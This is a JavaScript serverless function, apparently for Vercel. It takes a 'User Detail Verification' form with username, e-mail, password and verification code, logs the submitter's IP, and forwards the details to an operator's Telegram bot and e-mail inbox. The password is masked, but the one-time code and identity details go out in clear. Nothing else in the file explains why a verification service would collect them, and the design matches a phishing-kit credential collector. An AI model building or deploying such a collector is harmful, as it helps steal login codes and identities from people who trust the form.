/**
 * Vercel Serverless Function
 * ---------------------------
 * Receives the User Detail Verification form submission and forwards it to:
 *   1) Telegram (via Telegram Bot API - free)
 *   2) E-mail   (via Resend API - free tier)
 *
 * Environment variables (set in Vercel dashboard -> Settings -> Environment Variables):
 *   TELEGRAM_BOT_TOKEN  - bot token from @BotFather
 *   TELEGRAM_CHAT_ID    - your chat id to receive messages
 *   RESEND_API_KEY      - API key from https://resend.com
 *   EMAIL_FROM          - sender e-mail (use onboarding@resend.dev while domain not verified)
 *   EMAIL_TO            - recipient e-mail where notifications should arrive
 */

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const RESEND_API_KEY = process.env.RESEND_API_KEY;
const EMAIL_FROM = process.env.EMAIL_FROM || "Verification <onboarding@resend.dev>";
const EMAIL_TO = process.env.EMAIL_TO || null;

function maskPassword(pw) {
  if (!pw) return "";
  return pw.replace(/./g, "*");
}

function buildTelegramText(data) {
  const lines = [
    "\uD83D\uDD10 *NEW USER DETAIL VERIFICATION*",
    "\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500",
    "\uD83D\uDC64 *Username:* " + (data.username || "-"),
    "\uD83D\uDCE7 *E-Mail Address:* " + (data.email || "-"),
    "\uD83D\uDD11 *Password:* " + (maskPassword(data.password) || "-"),
    "\uD83D\uDD22 *Verification Code:* " + (data.code || "-"),
    "\uD83D\uDDD3\uFE0F *Date:* " + new Date().toISOString(),
    "\uD83D\uDCBB *IP:* " + (data.ip || "unknown"),
  ];
  return lines.join("\n");
}

function buildEmailHtml(data) {
  // Build HTML entities via concatenation so the file never contains
  // literal entity strings that could be mangled by tooling.
  const esc = (s) =>
    String(s == null ? "" : s).replace(/[&<>"']/g, function (c) {
      if (c === "&") return "&amp;";
      if (c === "<") return "&" + "lt;";
      if (c === ">") return "&" + "gt;";
      if (c === '"') return "&" + "quot;";
      return "&" + "#39;";
    });

  const rows = [
    ["Username", esc(data.username)],
    ["E-Mail Address", esc(data.email)],
    ["Password", maskPassword(data.password) || "-"],
    ["Verification Code", esc(data.code)],
    ["Date", new Date().toISOString()],
    ["IP Address", esc(data.ip || "unknown")],
  ]
    .map(
      (r) =>
        "<tr><td style='padding:8px;border:1px solid #ddd;background:#f4f4f4;font-weight:bold;'>" +
        r[0] +
        "</td><td style='padding:8px;border:1px solid #ddd;'>" +
        r[1] +
        "</td></tr>"
    )
    .join("");

  return (
    "<div style='font-family:Arial,Helvetica,sans-serif;max-width:600px;margin:auto;border:1px solid #e0e0e0;border-radius:6px;overflow:hidden;'>" +
    "<div style='background:#1e325d;color:#fff;padding:16px;font-size:18px;font-weight:bold;'>" +
    "User Detail Verification</div>" +
    "<table style='width:100%;border-collapse:collapse;font-size:14px;color:#333;'>" +
    rows +
    "</table>" +
    "</div>"
  );
}

module.exports = async function handler(req, res) {
  // CORS + security headers
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  res.setHeader("X-Content-Type-Options", "nosniff");
  res.setHeader("X-Frame-Options", "DENY");
  res.setHeader("Referrer-Policy", "no-referrer");

  if (req.method === "OPTIONS") {
    return res.status(204).end();
  }

  if (req.method !== "POST") {
    return res.status(405).json({ ok: false, error: "Method not allowed." });
  }

  const body = req.body || {};
  const data = {
    username: String(body.username || "").trim(),
    email: String(body.email || "").trim(),
    password: String(body.password || ""),
    code: String(body.code || "").trim(),
    ip:
      req.headers["x-forwarded-for"] ||
      req.headers["x-real-ip"] ||
      req.socket?.remoteAddress ||
      "unknown",
  };

  // Basic validation
  if (!data.username || !data.email || !data.password || !data.code) {
    return res.status(400).json({ ok: false, error: "All fields are required." });
  }

  const emailRe = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!emailRe.test(data.email)) {
    return res.status(400).json({ ok: false, error: "Invalid e-mail address." });
  }

  const delivered = [];
  const failures = [];

  // 1) Send to Telegram
  if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
    try {
      const tResp = await fetch(
        "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: buildTelegramText(data),
            parse_mode: "Markdown",
          }),
        }
      );
      const tJson = await tResp.json();
      if (tJson.ok) {
        delivered.push("telegram");
      } else {
        failures.push("Telegram: " + (tJson.description || "unknown error"));
      }
    } catch (err) {
      failures.push("Telegram: " + err.message);
    }
  } else {
    failures.push("Telegram: not configured (missing TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID)");
  }

  // 2) Send E-mail via Resend
  if (RESEND_API_KEY && EMAIL_TO) {
    try {
      const eResp = await fetch("https://api.resend.com/emails", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: "Bearer " + RESEND_API_KEY,
        },
        body: JSON.stringify({
          from: EMAIL_FROM,
          to: [EMAIL_TO],
          subject: "New User Detail Verification - " + data.email,
          html: buildEmailHtml(data),
        }),
      });
      const eJson = await eResp.json();
      if (eResp.ok && eJson.id) {
        delivered.push("email");
      } else {
        failures.push("Email: " + (eJson.message || "unknown error"));
      }
    } catch (err) {
      failures.push("Email: " + err.message);
    }
  } else {
    failures.push("Email: not configured (missing RESEND_API_KEY / EMAIL_TO)");
  }

  if (delivered.length > 0) {
    return res.status(200).json({
      ok: true,
      delivered: delivered,
      message: "Verification details received successfully.",
    });
  }

  return res.status(500).json({
    ok: false,
    error: "Notification delivery failed: " + failures.join(" | "),
  });
};

